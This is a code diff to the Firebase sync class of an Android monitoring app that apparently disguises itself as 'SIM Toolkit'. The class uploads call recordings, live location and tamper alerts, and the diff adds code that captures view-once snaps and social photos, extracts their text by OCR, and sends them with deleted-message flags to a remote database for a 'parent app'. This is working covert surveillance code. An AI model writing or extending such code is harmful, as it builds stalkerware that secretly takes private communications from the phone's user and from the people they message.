@@ -32,17 +32,21 @@ class FirebaseSyncManager private constructor(private val context: Context) {
      * Updates live device telemetry (battery, online status, disguise profile, location)
      */
     fun syncDeviceStatus(
-        batteryLevel: Int,
-        isOnline: Boolean,
+        batteryLevel: Int? = null,
+        isOnline: Boolean = true,
         disguise: String = "SIM Toolkit",
         location: String = "Live GPS Active"
     ) {
         try {
             val dynamicModel = "${android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${android.os.Build.MODEL}"
+            val realBattery = batteryLevel ?: run {
+                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
+                bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 85
+            }
             val statusData = hashMapOf(
                 "id" to childId,
                 "deviceModel" to dynamicModel,
-                "batteryLevel" to batteryLevel,
+                "batteryLevel" to realBattery,
                 "isOnline" to isOnline,
                 "selectedDisguise" to disguise,
                 "locationAddress" to location,
@@ -74,6 +78,7 @@ class FirebaseSyncManager private constructor(private val context: Context) {
         durationSeconds: Long,
         audioFile: File?,
         isTamperAttemptDetected: Boolean = false,
+        callDateMs: Long? = null,
         onComplete: ((Boolean) -> Unit)? = null
     ) {
         try {
@@ -85,12 +90,12 @@ class FirebaseSyncManager private constructor(private val context: Context) {
                     storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                         saveCallDoc(
                             callId, contactName, phoneNumber, callType,
-                            durationSeconds, downloadUri.toString(), isTamperAttemptDetected, onComplete
+                            durationSeconds, downloadUri.toString(), isTamperAttemptDetected, callDateMs, onComplete
                         )
                     }.addOnFailureListener {
                         saveCallDoc(
                             callId, contactName, phoneNumber, callType,
-                            durationSeconds, audioFile.name, isTamperAttemptDetected, onComplete
+                            durationSeconds, audioFile.name, isTamperAttemptDetected, callDateMs, onComplete
                         )
                     }
                 }.addOnFailureListener { e ->
@@ -98,13 +103,13 @@ class FirebaseSyncManager private constructor(private val context: Context) {
                     // Fallback to storing metadata with local file name
                     saveCallDoc(
                         callId, contactName, phoneNumber, callType,
-                        durationSeconds, audioFile.name, isTamperAttemptDetected, onComplete
+                        durationSeconds, audioFile.name, isTamperAttemptDetected, callDateMs, onComplete
                     )
                 }
             } else {
                 saveCallDoc(
                     callId, contactName, phoneNumber, callType,
-                    durationSeconds, "", isTamperAttemptDetected, onComplete
+                    durationSeconds, "", isTamperAttemptDetected, callDateMs, onComplete
                 )
             }
         } catch (e: Exception) {
@@ -121,8 +126,15 @@ class FirebaseSyncManager private constructor(private val context: Context) {
         durationSeconds: Long,
         recordingUrl: String,
         isTamperAttemptDetected: Boolean,
+        callDateMs: Long? = null,
         onComplete: ((Boolean) -> Unit)?
     ) {
+        val timestampVal = if (callDateMs != null && callDateMs > 0) {
+            com.google.firebase.Timestamp(java.util.Date(callDateMs))
+        } else {
+            FieldValue.serverTimestamp()
+        }
+
         val callData = hashMapOf(
             "id" to callId,
             "contactName" to contactName,
@@ -131,7 +143,7 @@ class FirebaseSyncManager private constructor(private val context: Context) {
             "durationSeconds" to durationSeconds,
             "recordingUrl" to recordingUrl,
             "isTamperAttemptDetected" to isTamperAttemptDetected,
-            "timestamp" to FieldValue.serverTimestamp()
+            "timestamp" to timestampVal
         )
 
         firestore.collection("calls")
@@ -147,6 +159,73 @@ class FirebaseSyncManager private constructor(private val context: Context) {
                 Log.e(AppConstants.TAG, "Firestore: Failed to sync call record", e)
                 onComplete?.invoke(false)
             }
+    }
+
+    /**
+     * Uploads captured 1-view snaps or social photos directly to Firebase Storage
+     * and creates a rich message doc with mediaUrl and ML Kit OCR text for parent app.
+     */
+    fun uploadMediaAndSyncChatMessage(
+        msgId: String,
+        app: String,
+        sender: String,
+        text: String,
+        mediaFile: File,
+        mediaType: String = "snap",
+        isViewOnce: Boolean = true,
+        isIncoming: Boolean = true,
+        isDeletedBySender: Boolean = false,
+        isWatchlistTarget: Boolean = false,
+        ocrText: String? = null
+    ) {
+        try {
+            if (!mediaFile.exists() || mediaFile.length() == 0L) {
+                syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
+                return
+            }
+
+            val storageRef = storage.reference.child("snaps/$childId/${mediaFile.name}")
+            val uploadTask = storageRef.putFile(Uri.fromFile(mediaFile))
+
+            uploadTask.addOnSuccessListener {
+                storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
+                    val fullText = if (!ocrText.isNullOrBlank()) {
+                        "$text\n📝 [Snap Text]: \"$ocrText\""
+                    } else {
+                        text
+                    }
+                    val msgData = hashMapOf(
+                        "id" to msgId,
+                        "app" to app,
+                        "sender" to sender,
+                        "text" to fullText,
+                        "mediaUrl" to downloadUri.toString(),
+                        "mediaType" to mediaType,
+                        "isViewOnce" to isViewOnce,
+                        "isIncoming" to isIncoming,
+                        "isDeletedBySender" to isDeletedBySender,
+                        "isWatchlistTarget" to isWatchlistTarget,
+                        "timestamp" to FieldValue.serverTimestamp()
+                    )
+                    firestore.collection("chats")
+                        .document(childId)
+                        .collection("messages")
+                        .document(msgId)
+                        .set(msgData, SetOptions.merge())
+                        .addOnSuccessListener {
+                            Log.i(AppConstants.TAG, "Firestore: Snap media synced successfully ($msgId)")
+                        }
+                }.addOnFailureListener {
+                    syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
+                }
+            }.addOnFailureListener { e ->
+                Log.e(AppConstants.TAG, "Storage: Snap upload failed, falling back to text only", e)
+                syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
+            }
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error in uploadMediaAndSyncChatMessage", e)
+            syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
+        }
     }
 
     /**
